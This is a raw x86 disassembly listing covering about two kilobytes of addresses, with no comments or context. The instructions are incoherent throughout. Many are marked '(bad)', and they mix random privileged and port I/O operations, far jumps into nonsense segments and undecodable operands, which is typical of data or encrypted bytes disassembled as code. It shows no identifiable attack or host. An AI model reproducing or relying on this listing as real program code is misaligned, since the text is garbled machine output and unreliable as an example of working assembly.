  41d5d8:	mov    eax,ds:0xcd18fd61
  41d5dd:	call   0xc833:0xe490a437
  41d5e4:	pusha  
  41d5e5:	cmp    edi,DWORD PTR [ecx+0x181405e3]
  41d5eb:	pop    esi
  41d5ec:	(bad)  
  41d5ed:	jns    0x41d58e
  41d5ef:	sti    
  41d5f0:	imul   ebp,DWORD PTR [esi+eiz*1-0x27],0xffffffa2
  41d5f5:	or     al,0xd6
  41d5f7:	ffreep st(2)
  41d5f9:	adc    ebp,edi
  41d5fb:	jns    0x41d580
  41d5fd:	mov    cl,0xb9
  41d5ff:	(bad)  
  41d600:	(bad)  
  41d601:	push   ebx
  41d602:	std    
  41d603:	sub    DWORD PTR [ecx+0x3727c3cf],eax
  41d609:	jle    0x41d646
  41d60b:	push   ss
  41d60c:	(bad)  
  41d60e:	xchg   ebp,ecx
  41d610:	push   ebx
  41d611:	mov    esi,0x20e96426
  41d616:	std    
  41d617:	pop    ebx
  41d618:	lds    edx,FWORD PTR [esi+ebx*8-0x22a226c]
  41d61f:	(bad)  
  41d620:	cmc    
  41d621:	in     al,0xb5
  41d623:	dec    edx
  41d624:	sbb    DWORD PTR [ebx-0x4814fb91],eax
  41d62a:	mov    ds:0x3e40b0ca,eax
  41d62f:	mov    fs,WORD PTR [ebx]
  41d631:	(bad)  
  41d633:	fdiv   QWORD PTR [ebp+eiz*4-0x1ce37c1a]
  41d63a:	cld    
  41d63b:	sbb    edi,edi
  41d63d:	xchg   edx,eax
  41d63e:	xchg   ecx,eax
  41d63f:	cli    
  41d640:	mov    esp,DWORD PTR [edx-0x23f2e137]
  41d646:	fld    TBYTE PTR [ecx-0x469a3d50]
  41d64c:	adc    esp,DWORD PTR [ecx+0xd]
  41d64f:	inc    ebp
  41d650:	pop    es
  41d651:	mov    ?,ebp
  41d653:	cmp    BYTE PTR [edx+0x5d],al
  41d656:	sbb    eax,0x3bd6559f
  41d65b:	enter  0xf629,0xc8
  41d65f:	jge    0x41d6a9
  41d661:	jmp    0xd21e:0x3eebe0c2
  41d668:	ror    BYTE PTR [eax],cl
  41d66a:	inc    esp
  41d66b:	sbb    DWORD PTR [eax+eiz*8],eax
  41d66e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d66f:	cmp    DWORD PTR [ecx-0x29aa8abf],esp
  41d675:	sub    bh,dl
  41d677:	out    dx,al
  41d678:	mov    ch,0xd8
  41d67a:	div    BYTE PTR [ebx+0x11755e7]
  41d680:	push   ds
  41d681:	fadd   QWORD PTR [ecx]
  41d683:	mov    edx,0x90bcf503
  41d688:	inc    ecx
  41d689:	stc    
  41d68a:	cld    
  41d68b:	popf   
  41d68c:	ror    esp,cl
  41d68e:	adc    BYTE PTR [esi-0x32],cl
  41d691:	add    bl,bl
  41d693:	mov    esp,0x93334fe8
  41d698:	sti    
  41d699:	add    ah,BYTE PTR [ebx]
  41d69b:	cmp    ch,ah
  41d69d:	mov    DWORD PTR [eax+0x5f],eax
  41d6a0:	mov    ah,0xe0
  41d6a2:	enter  0x51fe,0xdf
  41d6a6:	jmp    0x41d6c1
  41d6a8:	xchg   ecx,eax
  41d6a9:	push   edi
  41d6aa:	push   ds
  41d6ab:	adc    cl,BYTE PTR [esi+0x43]
  41d6ae:	inc    ch
  41d6b0:	pop    ss
  41d6b1:	mov    ecx,0x4e978a5f
  41d6b6:	mov    ch,0x72
  41d6b8:	and    eax,0x4f63bde
  41d6bd:	inc    edx
  41d6be:	mov    bl,BYTE PTR [ebx+0x5b]
  41d6c1:	dec    edi
  41d6c2:	pop    ss
  41d6c3:	dec    ebp
  41d6c4:	jmp    0x41d71c
  41d6c6:	jmp    FWORD PTR [eax]
  41d6c8:	adc    BYTE PTR [esi],ah
  41d6ca:	sbb    al,ch
  41d6cc:	dec    eax
  41d6cd:	fiadd  WORD PTR [esi+0x36378cb1]
  41d6d3:	sub    al,0xdc
  41d6d5:	push   edx
  41d6d6:	ret    
  41d6d7:	cwde   
  41d6d8:	mov    ds:0xb763fd40,eax
  41d6dd:	hlt    
  41d6de:	add    bl,ch
  41d6e0:	int3   
  41d6e1:	(bad)  
  41d6e2:	adc    esi,DWORD PTR [esi-0x37d934fe]
  41d6e8:	ror    DWORD PTR [esp+esi*1+0x2b925166],1
  41d6ef:	jg     0x41d6dc
  41d6f1:	out    0x1,eax
  41d6f3:	dec    eax
  41d6f4:	dec    esi
  41d6f5:	addr16 mov al,ds:0x7519
  41d6f9:	jmp    0x5741:0x1f6737ed
  41d700:	scas   al,BYTE PTR es:[edi]
  41d701:	mov    ch,0xc8
  41d703:	in     al,dx
  41d704:	jmp    0x41d725
  41d706:	pop    edx
  41d707:	xor    BYTE PTR [ecx+0x7b2b08b9],dh
  41d70d:	fnstenv [edx+0x29]
  41d710:	cwde   
  41d711:	push   edi
  41d712:	mov    ebp,0xc5bf349c
  41d717:	adc    DWORD PTR [edi],0xffffffc0
  41d71a:	out    0xa5,eax
  41d71c:	sbb    bl,BYTE PTR [edi-0x79]
  41d71f:	mov    al,ds:0x36f8a9da
  41d724:	mov    esi,0xa95ce0df
  41d729:	sti    
  41d72a:	jmp    0x3e45de7
  41d72f:	rcl    dh,cl
  41d731:	int3   
  41d732:	add    BYTE PTR [esi+eiz*2-0x7d],0xce
  41d737:	adc    edi,DWORD PTR [ebx-0x3d4a0164]
  41d73d:	(bad)  
  41d73e:	and    bh,BYTE PTR [eax+0x76fcad53]
  41d744:	xor    al,0x29
  41d746:	fsub   st,st(0)
  41d748:	jmp    0x41d6f3
  41d74a:	call   DWORD PTR [esi+edx*8-0xb0d47c6]
  41d751:	fist   WORD PTR ds:0xd5a1f699
  41d757:	adc    edx,DWORD PTR [edx-0x50]
  41d75a:	cld    
  41d75b:	push   ss
  41d75c:	test   esp,edx
  41d75e:	xor    ebx,0x24
  41d761:	test   ebp,esp
  41d763:	(bad)  
  41d764:	dec    ebx
  41d765:	cmp    BYTE PTR [edi-0x2ce02a7c],cl
  41d76b:	mov    al,0xc5
  41d76d:	inc    ebp
  41d76e:	mov    eax,ds:0x2ab8ea2c
  41d773:	dec    ecx
  41d774:	fst    QWORD PTR [edi-0xc]
  41d777:	mov    fs,WORD PTR [esi+0x3dd5cedf]
  41d77d:	mov    bh,0x9d
  41d77f:	sbb    ebx,DWORD PTR [eax+eax*2-0x3]
  41d783:	fnstcw WORD PTR [esi+0x78]
  41d786:	stc    
  41d787:	xor    ebp,esi
  41d789:	cmp    BYTE PTR [edi],ch
  41d78b:	sub    ebx,DWORD PTR [ebx]
  41d78d:	hlt    
  41d78e:	fxch   st(2)
  41d790:	fcmovnb st,st(4)
  41d792:	pop    ebx
  41d793:	push   esp
  41d794:	aam    0xec
  41d796:	jl     0x41d813
  41d798:	lods   al,BYTE PTR ds:[esi]
  41d799:	int3   
  41d79a:	sti    
  41d79b:	daa    
  41d79c:	xor    ah,BYTE PTR [ebx]
  41d79e:	sbb    eax,0x267e1c68
  41d7a3:	js     0x41d7c8
  41d7a5:	mov    ds:0x5bbe8c15,al
  41d7aa:	add    esi,DWORD PTR [ebx+0x68]
  41d7ad:	pop    edi
  41d7ae:	loope  0x41d766
  41d7b0:	xchg   edx,eax
  41d7b1:	test   BYTE PTR [esi-0x4dda1483],dh
  41d7b7:	jecxz  0x41d766
  41d7b9:	push   edi
  41d7ba:	jl     0x41d825
  41d7bc:	adc    eax,0xee188ddf
  41d7c1:	sbb    ebx,DWORD PTR [ecx-0x32d1000]
  41d7c7:	mov    ecx,0x281340ae
  41d7cc:	popf   
  41d7cd:	out    0xa,eax
  41d7cf:	fwait
  41d7d0:	test   bh,bl
  41d7d2:	xor    edi,ebp
  41d7d4:	or     al,0xcf
  41d7d6:	mov    edx,0xfd648f4b
  41d7db:	scas   al,BYTE PTR es:[edi]
  41d7dc:	jo     0x41d797
  41d7de:	mov    fs,WORD PTR [ebp+ecx*8+0x56]
  41d7e2:	int    0xd1
  41d7e4:	and    ax,0x5c9
  41d7e8:	imul   ebp,DWORD PTR [edi+0x63],0xffffffc6
  41d7ec:	outs   dx,DWORD PTR ds:[esi]
  41d7ed:	mov    ds:0xb74ac9fc,al
  41d7f2:	push   eax
  41d7f3:	fwait
  41d7f4:	push   ds
  41d7f5:	cmp    ebp,ebx
  41d7f7:	(bad)  
  41d7f8:	mov    bh,0x39
  41d7fa:	and    eax,0x8b362860
  41d7ff:	aas    
  41d800:	jmp    0x41d853
  41d802:	dec    eax
  41d803:	fcomip st,st(7)
  41d805:	ja     0x41d7aa
  41d807:	outs   dx,DWORD PTR ds:[esi]
  41d808:	or     bh,bl
  41d80a:	lea    ebp,[eax-0x51]
  41d80d:	sbb    BYTE PTR [esi+0x33],0x22
  41d811:	mov    edx,0xb3a9edfc
  41d816:	sbb    edi,DWORD PTR ds:0xc8c1d9ee
  41d81c:	add    dh,al
  41d81e:	xor    BYTE PTR [ebx+0x4b8f4f53],ch
  41d824:	or     DWORD PTR [ecx],esi
  41d826:	add    bh,BYTE PTR [esi-0x7b]
  41d829:	add    eax,0x5d8cb5fd
  41d82e:	dec    edx
  41d82f:	hlt    
  41d830:	neg    bh
  41d832:	scas   al,BYTE PTR es:[edi]
  41d833:	dec    esi
  41d834:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d835:	mov    WORD PTR [eax-0x2a],ss
  41d838:	(bad)  
  41d839:	gs hlt 
  41d83b:	or     dh,cl
  41d83d:	inc    eax
  41d83e:	outs   dx,BYTE PTR ds:[esi]
  41d83f:	scas   al,BYTE PTR es:[edi]
  41d840:	cld    
  41d841:	pop    ecx
  41d842:	sub    eax,0x16c85ee8
  41d847:	adc    eax,0x1c07df33
  41d84c:	mov    bh,BYTE PTR [eax+0x4a546fd5]
  41d852:	std    
  41d853:	push   0x8c2fcb5
  41d858:	jbe    0x41d800
  41d85a:	in     al,0xc7
  41d85c:	shl    DWORD PTR [edx+0x5fd61887],0x3
  41d863:	xchg   ebx,eax
  41d864:	jmp    0x41d891
  41d866:	sub    dh,BYTE PTR [eax-0x2a3311a0]
  41d86c:	out    dx,al
  41d86d:	fbstp  TBYTE PTR [ebx-0x495a75fa]
  41d873:	data16 std 
  41d875:	or     DWORD PTR [ebp-0x125613b4],esp
  41d87b:	outs   dx,DWORD PTR ds:[esi]
  41d87c:	repz pop ebp
  41d87e:	pop    edi
  41d87f:	add    al,0xcb
  41d881:	xor    edi,ebp
  41d883:	retf   0x4911
  41d886:	push   ss
  41d887:	mov    esi,0xc2ad4f2c
  41d88c:	cmp    eax,0xb1bafd93
  41d891:	jae    0x41d843
  41d893:	pop    esp
  41d894:	xor    eax,0xedcb4dd5
  41d899:	fnsave [ebp-0x34601999]
  41d89f:	cwde   
  41d8a0:	pop    ss
  41d8a1:	and    DWORD PTR [esi-0x10b91147],ebp
  41d8a7:	out    dx,eax
  41d8a8:	or     BYTE PTR [edi-0x54],bl
  41d8ab:	pushf  
  41d8ac:	imul   DWORD PTR ds:0xdb23c7c9
  41d8b2:	cmp    DWORD PTR [ebx+0x6f],0x43bb3c99
  41d8b9:	rcl    DWORD PTR [ebp+0x7dffecee],1
  41d8bf:	in     al,0xb1
  41d8c1:	xchg   edx,eax
  41d8c2:	shl    DWORD PTR [ebx-0x67e299f8],1
  41d8c8:	call   0xcd91:0x4c07dbdf
  41d8cf:	jle    0x41d8c7
  41d8d1:	cmp    al,0xfd
  41d8d3:	cmp    cl,BYTE PTR [edx-0x9]
  41d8d6:	fcomp  DWORD PTR [eax-0x6d]
  41d8d9:	mov    eax,ds:0xac5dc845
  41d8de:	in     al,0x7c
  41d8e0:	sub    DWORD PTR [ebp-0x4e],ebx
  41d8e3:	clc    
  41d8e4:	jmp    0x41d90f
  41d8e6:	pushf  
  41d8e7:	adc    DWORD PTR [edx-0x1f947875],ecx
  41d8ed:	(bad)  
  41d8ef:	pusha  
  41d8f0:	repnz push 0x4
  41d8f3:	pop    edx
  41d8f4:	sbb    DWORD PTR [ecx+0x15eb46ac],esp
  41d8fa:	div    al
  41d8fc:	retf   
  41d8fd:	in     al,0xbf
  41d8ff:	adc    ah,cl
  41d901:	enter  0xc89a,0x61
  41d905:	fisttp DWORD PTR [eax]
  41d907:	out    dx,al
  41d908:	jmp    0xe69e7211
  41d90d:	jns    0x41d955
  41d90f:	push   edi
  41d910:	mov    esp,0x75d74e6a
  41d915:	mov    bh,0xb0
  41d917:	mov    ebx,0xcadcdfb9
  41d91c:	jbe    0x41d949
  41d91e:	(bad)  
  41d91f:	mov    eax,0x90e258ff
  41d924:	or     bl,BYTE PTR [ebp+eiz*2+0x54]
  41d928:	std    
  41d929:	push   cs
  41d92a:	jns    0x41d974
  41d92c:	push   cs
  41d92d:	mov    dh,0x2b
  41d92f:	loopne 0x41d94f
  41d931:	sbb    eax,0xab10b9fd
  41d936:	call   0xaf6685c6
  41d93b:	jmp    0x99a5:0x61fc5ce6
  41d942:	fwait
  41d943:	mov    ch,0x46
  41d945:	ss push ss
  41d947:	dec    ecx
  41d948:	push   ss
  41d949:	xlat   BYTE PTR ds:[ebx]
  41d94a:	pop    ebp
  41d94b:	inc    ebp
  41d94c:	sub    ebx,DWORD PTR [edi-0x3e443735]
  41d952:	mov    esi,0xc6d8cd3b
  41d957:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d958:	in     al,dx
  41d959:	jo     0x41d8e6
  41d95b:	inc    edx
  41d95c:	adc    BYTE PTR [ebx+0x370f125e],bh
  41d962:	sbb    al,cl
  41d964:	fs cmp al,0x45
  41d967:	js     0x41d987
  41d969:	inc    ecx
  41d96a:	retf   
  41d96b:	jmp    0x5734a406
  41d970:	mov    ch,0x59
  41d972:	repz pop es
  41d974:	daa    
  41d975:	inc    esi
  41d976:	add    al,0xb1
  41d978:	call   0x4bdf:0x539e7cf9
  41d97f:	out    0x67,al
  41d981:	dec    edx
  41d982:	cmp    BYTE PTR [ebx+0xd],ah
  41d985:	jmp    0x4285c686
  41d98a:	pusha  
  41d98b:	jg     0x41d93c
  41d98d:	xor    eax,DWORD PTR [edi]
  41d98f:	enter  0x7059,0x28
  41d993:	aas    
  41d994:	jns    0x41d9f5
  41d996:	(bad)  
  41d997:	adc    bl,ch
  41d999:	std    
  41d99a:	xor    eax,0x97630609
  41d99f:	mov    esp,0xed100a5f
  41d9a4:	jmp    0x41d9a7
  41d9a6:	mov    ch,dh
  41d9a8:	inc    ebp
  41d9a9:	in     eax,dx
  41d9aa:	adc    esp,esp
  41d9ac:	out    0x8a,eax
  41d9ae:	lea    edi,[eax+0xebd4254]
  41d9b4:	shr    BYTE PTR [esi],0x36
  41d9b7:	enter  0x3478,0x47
  41d9bb:	push   eax
  41d9bc:	in     al,0xc4
  41d9be:	into   
  41d9bf:	pop    ebp
  41d9c0:	jmp    0x41d990
  41d9c2:	jge    0x41d974
  41d9c4:	cmc    
  41d9c5:	jecxz  0x41da43
  41d9c7:	std    
  41d9c8:	jge    0x41d9a6
  41d9ca:	imul   edi,ecx,0xffffffc1
  41d9cd:	and    al,0x4
  41d9cf:	add    DWORD PTR [ebx-0x48],edi
  41d9d2:	push   eax
  41d9d3:	add    DWORD PTR [eax],0x6c
  41d9d6:	inc    edx
  41d9d7:	(bad)
  41d9db:	jne    0x41da26
  41d9dd:	dec    edi
  41d9de:	push   eax
  41d9df:	fucom  st(5)
  41d9e1:	fcomip st,st(7)
  41d9e3:	sub    BYTE PTR [eax+0x510a782],cl
  41d9e9:	test   BYTE PTR [ecx],cl
  41d9eb:	mov    eax,ds:0xce8ca575
  41d9f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d9f1:	or     DWORD PTR [eax+ebp*1],esi
  41d9f4:	test   al,0xca
  41d9f6:	pusha  
  41d9f7:	jge    0x41d9ca
  41d9f9:	(bad)  
  41d9fb:	je     0x41d9dc
  41d9fd:	outs   dx,DWORD PTR ds:[esi]
  41d9fe:	stc    
  41d9ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41da00:	stos   BYTE PTR es:[edi],al
  41da01:	adc    dl,BYTE PTR [edx-0x4f89caec]
  41da07:	call   0x39276fee
  41da0c:	pop    esi
  41da0d:	sar    esp,1
  41da0f:	inc    esi
  41da10:	mov    eax,0xe3189c96
  41da15:	(bad)  
  41da16:	cli    
  41da17:	and    esi,eax
  41da19:	stc    
  41da1a:	cdq    
  41da1b:	sti    
  41da1c:	data16 fistp QWORD PTR [ecx]
  41da1f:	sbb    eax,0x73bcb7a0
  41da24:	jecxz  0x41da20
  41da26:	fmul   st,st(1)
  41da28:	add    edi,DWORD PTR [edx-0x4068da41]
  41da2e:	cmp    al,0xe8
  41da30:	or     edi,ebx
  41da32:	mov    cs,WORD PTR [edi-0x6c694954]
  41da38:	mov    es,WORD PTR [eax]
  41da3a:	std    
  41da3b:	sbb    eax,0x264dd995
  41da40:	push   ebp
  41da41:	(bad)
  41da44:	int    0xde
  41da46:	shr    BYTE PTR [eax-0x3d6a2f8a],1
  41da4c:	xchg   edx,eax
  41da4d:	inc    ebx
  41da4e:	dec    ecx
  41da4f:	jp     0x41da3c
  41da51:	std    
  41da52:	push   cs
  41da53:	or     ebp,DWORD PTR [ecx-0x1c]
  41da56:	jns    0x41da11
  41da58:	inc    edx
  41da59:	or     edx,ebx
  41da5b:	xchg   BYTE PTR [ebp-0x71],ch
  41da5e:	sbb    DWORD PTR [ecx],ecx
  41da60:	retf   0xac8d
  41da63:	pop    esi
  41da64:	jae    0x41dadc
  41da66:	mov    ?,WORD PTR [eax-0x15]
  41da69:	scas   al,BYTE PTR es:[edi]
  41da6a:	add    BYTE PTR [edx+0x47],ch
  41da6d:	xchg   esp,eax
  41da6e:	or     ch,0x80
  41da71:	add    eax,0xedeb09ce
  41da76:	push   edi
  41da77:	dec    ecx
  41da78:	loope  0x41da70
  41da7a:	stos   BYTE PTR es:[edi],al
  41da7b:	add    bh,bh
  41da7d:	sar    BYTE PTR [edi-0x235f94aa],0xa1
  41da84:	rol    dl,1
  41da86:	mov    dl,0xc8
  41da88:	xor    BYTE PTR [edx+0x57438ac],bh
  41da8e:	repnz das 
  41da90:	jmp    0x41da4b
  41da92:	mov    DWORD PTR [edx+0x40],ecx
  41da95:	scas   eax,DWORD PTR es:[edi]
  41da96:	inc    eax
  41da97:	inc    ebp
  41da98:	xchg   esi,eax
  41da99:	retf   
  41da9a:	sub    eax,esp
  41da9c:	fwait
  41da9d:	ja     0x41da9f
  41da9f:	mov    ebp,0x47d9a063
  41daa4:	dec    ebx
  41daa5:	or     al,0xc0
  41daa7:	jmp    0x5cc4:0xfc95a4eb
  41daae:	aad    0x1f
  41dab0:	(bad)  
  41dab1:	fmul   QWORD PTR [edx-0x6c10661d]
  41dab7:	test   BYTE PTR [ebx+0x26],0xa3
  41dabb:	std    
  41dabc:	jmp    0x41dadc
  41dabe:	fbstp  TBYTE PTR [ebx-0xab78b08]
  41dac4:	(bad)  
  41dac5:	fldcw  WORD PTR [esi-0x31cc878]
  41dacb:	and    eax,0x700dc9ed
  41dad0:	or     DWORD PTR [edi-0x3],edx
  41dad3:	shl    dh,cl
  41dad5:	and    al,0x8c
  41dad7:	push   esp
  41dad8:	(bad)  
  41dad9:	fwait
  41dada:	stos   DWORD PTR es:[edi],eax
  41dadb:	mov    edi,0x48790f96
  41dae0:	(bad)  [ebx+0x7]
  41dae3:	mov    ah,0x25
  41dae5:	xor    al,0xfe
  41dae7:	push   esi
  41dae8:	cld    
  41dae9:	in     al,dx
  41daea:	add    ebp,ebx
  41daec:	and    al,0xce
  41daee:	xchg   edi,eax
  41daef:	or     edx,DWORD PTR [ebx-0x668c2279]
  41daf5:	(bad)  
  41daf6:	icebp  
  41daf7:	(bad)  
  41daf8:	dec    ebp
  41daf9:	xchg   edx,eax
  41dafa:	sub    BYTE PTR [edi+0x10244e42],ch
  41db00:	jmp    0x41db3b
  41db02:	or     dh,cl
  41db04:	mov    bl,BYTE PTR [ebx]
  41db06:	rcl    DWORD PTR [ebx+0x1f36df8c],cl
  41db0c:	cmp    DWORD PTR [ebp+0x67],edx
  41db0f:	and    DWORD PTR [ebx],0x7347fd1d
  41db15:	jae    0x41daf9
  41db17:	clc    
  41db18:	js     0x41daf7
  41db1a:	loop   0x41dae3
  41db1c:	imul   edx,DWORD PTR [esi],0xce104d3a
  41db22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41db23:	cmc    
  41db24:	jmp    0x41dacd
  41db26:	sub    dl,al
  41db28:	mov    eax,ecx
  41db2a:	mov    bh,0xdd
  41db2c:	(bad)  [ebp-0x34]
  41db2f:	retf   
  41db30:	aam    0x39
  41db32:	and    dl,BYTE PTR [edx+0x2ba5225e]
  41db38:	and    ah,bl
  41db3a:	push   DWORD PTR [edx+0x48]
  41db3d:	xor    eax,0x3773cd1f
  41db42:	jge    0x41db91
  41db44:	and    edi,ebx
  41db46:	jmp    0x75bb:0x7f131bd1
  41db4d:	pop    esp
  41db4e:	std    
  41db4f:	and    BYTE PTR ds:0xdcba7a3a,cl
  41db55:	shr    BYTE PTR [ebp+edi*4-0x16],0x35
  41db5a:	sbb    ebx,ecx
  41db5c:	lods   al,BYTE PTR ds:[esi]
  41db5d:	dec    ecx
  41db5e:	xor    eax,0x6f4d4319
  41db63:	mov    gs,ebx
  41db65:	scas   al,BYTE PTR es:[edi]
  41db66:	adc    al,0x33
  41db68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41db69:	or     eax,0xdfc449c2
  41db6e:	(bad)  
  41db6f:	jmp    0xb99d136
  41db74:	xchg   esp,eax
  41db75:	xchg   ch,bh
  41db77:	in     eax,dx
  41db78:	ss jmp 0xcf5e:0xf215ca4a
  41db80:	js     0x41db36
  41db82:	sbb    bl,BYTE PTR [edx+ebp*4]
  41db85:	add    ebp,edi
  41db87:	loopne 0x41dc04
  41db89:	loop   0x41db6f
  41db8b:	scas   eax,DWORD PTR es:[edi]
  41db8c:	ret    0x94ff
  41db8f:	mov    dl,0xe2
  41db91:	jg     0x41db8d
  41db93:	jmp    0x41dbc8
  41db95:	(bad)  
  41db96:	das    
  41db97:	mov    esi,0x32101f6b
  41db9c:	enter  0x3534,0x49
  41dba0:	jmp    0x41db3a
  41dba2:	jp     0x41dba6
  41dba4:	cld    
  41dba5:	mov    edi,0xb601827
  41dbaa:	mov    WORD PTR [edi-0x15],gs
  41dbad:	adc    eax,0xe826d307
  41dbb2:	das    
  41dbb3:	cli    
  41dbb4:	ja     0x41db39
  41dbb6:	dec    BYTE PTR [ebx]
  41dbb8:	sub    DWORD PTR [eax+0x2712d14f],esi
  41dbbe:	sbb    BYTE PTR [edi+0x195edf18],cl
  41dbc4:	lea    edi,[ebp-0x26c0ddbe]
  41dbca:	sti    
  41dbcb:	out    dx,al
  41dbcc:	mov    dh,dh
  41dbce:	pop    ebp
  41dbcf:	(bad)  
  41dbd0:	adc    DWORD PTR [ebp+edi*8-0x62],edi
  41dbd4:	add    BYTE PTR [ecx],dl
  41dbd6:	lea    esp,[edi+eax*2]
  41dbd9:	fild   WORD PTR [ebx-0x20]
  41dbdc:	jg     0x41dbad
  41dbde:	jmp    DWORD PTR [ebp-0x38]
  41dbe1:	(bad)  
  41dbe2:	std    
  41dbe3:	mov    ebp,0x952254ad
  41dbe8:	add    esi,DWORD PTR [edx+0x481bc855]
  41dbee:	mov    bh,0xe
  41dbf0:	ss cld 
  41dbf2:	hlt    
  41dbf3:	and    ah,0x35
  41dbf6:	xchg   ebp,eax
  41dbf7:	dec    esi
  41dbf8:	or     al,0x7d
  41dbfa:	mov    ebp,0x2739a6c8
  41dbff:	cmp    BYTE PTR [edi+ebx*8-0x4b],0x13
  41dc04:	sbb    al,BYTE PTR [edi+eax*8-0x2d558ec]
  41dc0b:	aad    0x12
  41dc0d:	push   cs
  41dc0e:	pop    edx
  41dc0f:	outs   dx,BYTE PTR ds:[esi]
  41dc10:	jo     0x41dc10
  41dc12:	fwait
  41dc13:	enter  0x8ac3,0xad
  41dc17:	jnp    0x41dbeb
  41dc19:	ror    BYTE PTR [eax],1
  41dc1b:	stos   DWORD PTR es:[edi],eax
  41dc1c:	out    dx,al
  41dc1d:	mov    al,ds:0x5f84026c
  41dc22:	pop    ebx
  41dc23:	sbb    BYTE PTR ss:[edx-0x72],cl
  41dc27:	(bad)  
  41dc28:	dec    edi
  41dc2a:	out    0xbf,eax
  41dc2c:	adc    bl,BYTE PTR [edi]
  41dc2e:	sub    dh,BYTE PTR [edx]
  41dc30:	adc    eax,0x79abfd42
  41dc35:	mov    esp,?
  41dc37:	sub    eax,0xc808b8b8
  41dc3c:	xchg   edi,eax
  41dc3d:	inc    esp
  41dc3e:	in     al,dx
  41dc3f:	mov    ch,0x54
  41dc41:	retf   
  41dc42:	cmc    
  41dc43:	mov    dl,0x0
  41dc45:	nop
  41dc46:	lods   eax,DWORD PTR ds:[esi]
  41dc47:	es in  eax,dx
  41dc49:	or     BYTE PTR [ebp+0x6c923d87],bl
  41dc4f:	cmp    DWORD PTR [ebx+eax*2+0x23376535],ebx
  41dc56:	(bad)
  41dc5a:	dec    edx
  41dc5b:	pop    edx
  41dc5c:	inc    esp
  41dc5d:	mov    esi,0x63eb0315
  41dc62:	fucomip st,st(0)
  41dc64:	dec    ecx
  41dc65:	inc    ebx
  41dc66:	ins    DWORD PTR es:[edi],dx
  41dc67:	test   BYTE PTR [eax-0x5f7cc521],0xa3
  41dc6e:	mov    dh,0xcd
  41dc70:	fyl2x  
  41dc72:	es pop ebx
  41dc74:	jmp    0x41dcee
  41dc76:	xchg   BYTE PTR [edx+0x52],al
  41dc79:	pusha  
  41dc7a:	mov    ebx,0xed37df3d
  41dc7f:	mov    ebp,0x9ea1bd6a
  41dc84:	pushw  cs
  41dc86:	cmp    BYTE PTR [esi+0x3c],ah
  41dc89:	out    dx,eax
  41dc8a:	shl    DWORD PTR [ebx-0x3a],0x6c
  41dc8e:	std    
  41dc8f:	push   edi
  41dc90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dc91:	fidiv  WORD PTR [edx+eax*1+0x68204c1c]
  41dc98:	rdmsr  
  41dc9a:	leave  
  41dc9b:	retf   
  41dc9c:	pop    eax
  41dc9d:	cmp    ebp,esp
  41dc9f:	jne    0x41dd07
  41dca1:	loop   0x41dc47
  41dca3:	out    dx,al
  41dca4:	sbb    eax,0x27ce0bd6
  41dca9:	mov    DWORD PTR [eax],0x70e9eb4c
  41dcaf:	jge    0x41dc76
  41dcb1:	cpuid  
  41dcb3:	enter  0x35cc,0xd
  41dcb7:	add    dh,BYTE PTR [edx]
  41dcb9:	mov    ecx,0x77eb7e2c
  41dcbe:	dec    eax
  41dcbf:	mov    DWORD PTR ss:[esp+ebx*1+0x23dff823],edi
  41dcc7:	dec    edi
  41dcc8:	fcom   DWORD PTR [edi+0x79f34232]
  41dcce:	std    
  41dccf:	sbb    edx,DWORD PTR [edx+esi*4+0x69]
  41dcd3:	and    DWORD PTR [edx-0x2],edx
  41dcd6:	int    0xc8
  41dcd8:	inc    edi
  41dcd9:	out    0xe7,eax
  41dcdb:	mov    esi,0x4c18328d
  41dce0:	out    0xf1,al
  41dce2:	inc    ebp
  41dce3:	aad    0xea
  41dce5:	(bad)  
  41dce6:	aas    
  41dce7:	ja     0x41dd2a
  41dce9:	aas    
  41dcea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dceb:	push   es
  41dcec:	jb     0x41dcc6
  41dcee:	xor    ecx,DWORD PTR [ecx]
  41dcf0:	sar    WORD PTR [edx+eax*4],0xe1
  41dcf5:	ret    0x11ce
  41dcf8:	repnz xchg ebp,eax
  41dcfa:	std    
  41dcfb:	fidivr WORD PTR [ecx+0x5f]
  41dcfe:	push   esi
  41dcff:	pop    ebx
  41dd00:	jae    0x41dc99
  41dd02:	xchg   eax,ecx
  41dd04:	les    ebx,FWORD PTR [esi-0x675c6325]
  41dd0a:	dec    eax
  41dd0b:	fs jmp 0xd89a:0x32774790
  41dd13:	dec    DWORD PTR [eax+ebx*1+0xb3ac8ac]
  41dd1a:	pop    eax
  41dd1b:	mov    al,0xab
  41dd1d:	ins    DWORD PTR es:[edi],dx
  41dd1e:	push   edi
  41dd1f:	mov    al,ds:0xb51d89eb
  41dd24:	leave  
  41dd25:	imul   ebx,DWORD PTR [edi+0x78],0xe2d8dfca
  41dd2c:	or     cl,dl
  41dd2e:	mov    ecx,ebp
  41dd30:	mov    esi,0x4009002d
  41dd35:	fwait
  41dd36:	hlt    
  41dd37:	adc    ebp,edx
  41dd39:	je     0x41dd3a
  41dd3b:	daa    
  41dd3c:	adc    DWORD PTR [ecx],esi
  41dd3e:	ror    eax,0x64
  41dd41:	bound  edx,QWORD PTR [edx]
  41dd43:	xchg   ebp,eax
  41dd44:	fldcw  WORD PTR [eax+0xa]
  41dd47:	in     al,dx
  41dd48:	jmp    0x41ddbf
  41dd4a:	jmp    0x41dcfd
  41dd4c:	jne    0x41ddba
  41dd4e:	push   ss
  41dd4f:	add    BYTE PTR [ecx-0x21],bh
  41dd52:	cmp    dh,BYTE PTR [ecx-0x5a]
  41dd55:	pop    ebp
  41dd56:	cli    
  41dd57:	neg    BYTE PTR [ecx]
  41dd59:	mov    ecx,0xdfca9140
  41dd5e:	lods   al,BYTE PTR ds:[esi]
  41dd5f:	pop    esp
  41dd60:	mov    ch,0x6b
  41dd62:	mov    bl,0x6c
  41dd64:	inc    ebx
  41dd65:	fisttp WORD PTR [esi]
  41dd67:	jmp    0x5af4:0xf781b34e
  41dd6e:	std    
  41dd6f:	jmp    0x41dd8a
  41dd71:	ss fucom st(3)
  41dd74:	xor    BYTE PTR [ebx],ah
  41dd76:	add    bh,cl
  41dd78:	loopne 0x41dd58
